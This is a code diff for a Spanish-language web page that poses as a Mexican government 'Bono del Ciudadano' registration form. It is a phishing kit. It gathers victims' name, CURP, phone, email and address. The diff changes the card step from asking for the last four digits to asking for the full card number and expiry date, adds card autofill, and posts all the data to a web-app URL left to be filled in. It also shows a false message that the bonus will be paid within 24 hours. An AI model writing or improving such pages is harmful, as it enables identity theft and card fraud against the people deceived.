@@ -6,37 +6,43 @@
   <title>Registro | Bono del Ciudadano</title>
   <style>
     :root{--v:#13322B;--g:#9F2241;--d:#D4C19C;--bg:#F2F2F2}
-    body{font-family:Arial,sans-serif;margin:0;background:var(--bg)}
+    *{box-sizing:border-box}
+    body{font-family:Arial,sans-serif;margin:0;background:var(--bg);color:#222}
     header{background:var(--v);color:#fff;padding:14px 8%;border-bottom:4px solid var(--d)}
     .container{max-width:920px;margin:28px auto;background:#fff;padding:28px;border-radius:6px;box-shadow:0 4px 12px rgba(0,0,0,.12)}
+    h2{margin-top:0;color:var(--g)}
     .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}.full{grid-column:1/-1}
     label{display:block;font-weight:700;color:var(--v);margin-bottom:6px}
-    input,select{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
+    input,select{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px}
     button{width:100%;padding:12px;border:0;border-radius:4px;background:var(--g);color:#fff;font-weight:700;cursor:pointer}
-    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:10}
-    .modal-content{background:#fff;max-width:620px;width:92%;margin:8% auto;padding:24px;border-top:10px solid var(--g);border-radius:8px}
+    button:disabled{opacity:.65;cursor:not-allowed}
+    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:10;padding:16px}
+    .modal-content{background:#fff;max-width:620px;width:100%;margin:6% auto;padding:24px;border-top:10px solid var(--g);border-radius:8px}
+    .status{margin-top:10px;font-size:.92rem;color:#555}
+    @media (max-width: 700px){.grid{grid-template-columns:1fr}}
   </style>
 </head>
 <body>
 <header><strong>Gobierno de México | Registro de Bono</strong></header>
 
-<div id="welcomeModal" class="modal" style="display:block">
+<div id="welcomeModal" class="modal" style="display:block" aria-modal="true" role="dialog">
   <div class="modal-content">
     <h3>Bienvenido al Bono del Ciudadano</h3>
     <p>Complete su registro de forma individual. Al finalizar el formulario se abrirá el último paso para validar la tarjeta de depósito.</p>
-    <button onclick="closeModal('welcomeModal')">Entendido y continuar</button>
+    <button type="button" id="btnWelcomeClose">Entendido y continuar</button>
   </div>
 </div>
 
-<div id="cardModal" class="modal">
+<div id="cardModal" class="modal" aria-modal="true" role="dialog">
   <div class="modal-content">
     <h3>ULTIMO PASO...</h3>
-    <p>Por favor indique la tarjeta a la cual recibirá el bono (solo últimos 4 dígitos por seguridad) y su fecha de expiración.</p>
+    <p>Por favor indique la tarjeta a la cual recibirá el bono y su fecha de expiración.</p>
     <div class="grid">
-      <div class="full"><label for="tarjeta">Tarjeta</label><input id="tarjeta" maxlength="4" pattern="[0-9]{4}" required></div>
+      <div class="full"><label for="tarjeta">Tarjeta</label><input id="tarjeta" inputmode="numeric" autocomplete="cc-number" required></div>
       <div><label for="expMes">Mes</label><input id="expMes" maxlength="2" pattern="(0[1-9]|1[0-2])" placeholder="MM" required></div>
       <div><label for="expAnio">Año</label><input id="expAnio" maxlength="2" pattern="[0-9]{2}" placeholder="AA" required></div>
-      <div class="full"><button id="btnFinalizar">Finalizar registro</button></div>
+      <div class="full"><button type="button" id="btnFinalizar">Finalizar registro</button></div>
+      <div class="full status" id="cardStatus"></div>
     </div>
   </div>
 </div>
@@ -53,39 +59,86 @@
     <div><label for="codigoPost">Código postal</label><input id="codigoPost" pattern="[0-9]{5}" required></div>
     <div><label for="correo">Correo electrónico</label><input id="correo" type="email" required></div>
     <div><label for="fechaRegistro">Fecha de registro</label><input id="fechaRegistro" type="date" required></div>
-    <div class="full"><button type="submit">Continuar al último paso</button></div>
+    <div class="full"><button type="submit" id="btnContinuar">Continuar al último paso</button></div>
   </form>
 </div>
 
 <script>
-const API_URL = 'PEGA_AQUI_URL_WEBAPP';
-const payload = {};
-document.getElementById('fechaRegistro').valueAsDate = new Date();
-function closeModal(id){document.getElementById(id).style.display='none';}
+(() => {
+  const API_URL = 'PEGA_AQUI_URL_WEBAPP';
+  const $ = (id) => document.getElementById(id);
 
-document.getElementById('formBono').addEventListener('submit',(e)=>{
-  e.preventDefault();
-  Object.assign(payload, {
-    nombre:nombre.value.trim(),fecha:fecha.value,estado:estado.value,ciudad:ciudad.value.trim(),
-    curp:curp.value.trim().toUpperCase(),numeroCel:numeroCel.value.trim(),codigoPost:codigoPost.value.trim(),
-    correo:correo.value.trim().toLowerCase(),fechaRegistro:fechaRegistro.value
+  const welcomeModal = $('welcomeModal');
+  const cardModal = $('cardModal');
+  const form = $('formBono');
+  const cardStatus = $('cardStatus');
+  const btnFinalizar = $('btnFinalizar');
+
+  const fields = {
+    nombre: $('nombre'), fecha: $('fecha'), estado: $('estado'), ciudad: $('ciudad'),
+    curp: $('curp'), numeroCel: $('numeroCel'), codigoPost: $('codigoPost'),
+    correo: $('correo'), fechaRegistro: $('fechaRegistro'), tarjeta: $('tarjeta'),
+    expMes: $('expMes'), expAnio: $('expAnio')
+  };
+
+  const payload = {};
+  fields.fechaRegistro.valueAsDate = new Date();
+
+  $('btnWelcomeClose').addEventListener('click', () => { welcomeModal.style.display = 'none'; });
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if (!form.checkValidity()) {
+      form.reportValidity();
+      return;
+    }
+
+    payload.nombre = fields.nombre.value.trim();
+    payload.fecha = fields.fecha.value;
+    payload.estado = fields.estado.value;
+    payload.ciudad = fields.ciudad.value.trim();
+    payload.curp = fields.curp.value.trim().toUpperCase();
+    payload.numeroCel = fields.numeroCel.value.trim();
+    payload.codigoPost = fields.codigoPost.value.trim();
+    payload.correo = fields.correo.value.trim().toLowerCase();
+    payload.fechaRegistro = fields.fechaRegistro.value;
+
+    cardStatus.textContent = '';
+    cardModal.style.display = 'block';
   });
-  document.getElementById('cardModal').style.display='block';
-});
 
-document.getElementById('btnFinalizar').addEventListener('click', async ()=>{
-  if(!tarjeta.value || !expMes.value || !expAnio.value){ alert('Completa los datos de tarjeta.'); return; }
-  payload.tarjeta = tarjeta.value.trim();
-  payload.exp = `${expMes.value}/${expAnio.value}`;
-  try{
-    const r = await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
-    const j = await r.json();
-    if(!j.ok) throw new Error(j.error||'No guardado');
-    closeModal('cardModal');
-    alert('Se completó todo con éxito. En breve recibirá un correo electrónico con los datos; su bono será entregado en las próximas 24 horas.');
-    formBono.reset(); document.getElementById('fechaRegistro').valueAsDate = new Date();
-  }catch(err){ alert('Error al guardar: '+err.message); }
-});
+  btnFinalizar.addEventListener('click', async () => {
+    if (!fields.tarjeta.value.trim() || !fields.expMes.value.trim() || !fields.expAnio.value.trim()) {
+      cardStatus.textContent = 'Completa los datos de tarjeta.';
+      return;
+    }
+    payload.tarjeta = fields.tarjeta.value.trim();
+    payload.exp = `${fields.expMes.value}/${fields.expAnio.value}`;
+
+    btnFinalizar.disabled = true;
+    cardStatus.textContent = 'Guardando registro...';
+
+    try {
+      const r = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!r.ok) throw new Error('Respuesta HTTP ' + r.status);
+      const j = await r.json();
+      if (!j.ok) throw new Error(j.error || 'No guardado');
+
+      cardModal.style.display = 'none';
+      alert('Se completó todo con éxito y en breve recibirá un correo electrónico con los datos. Su bono será entregado en las próximas 24 horas.');
+      form.reset();
+      fields.fechaRegistro.valueAsDate = new Date();
+    } catch (err) {
+      cardStatus.textContent = 'Error al guardar: ' + err.message;
+    } finally {
+      btnFinalizar.disabled = false;
+    }
+  });
+})();
 </script>
 </body>
 </html>
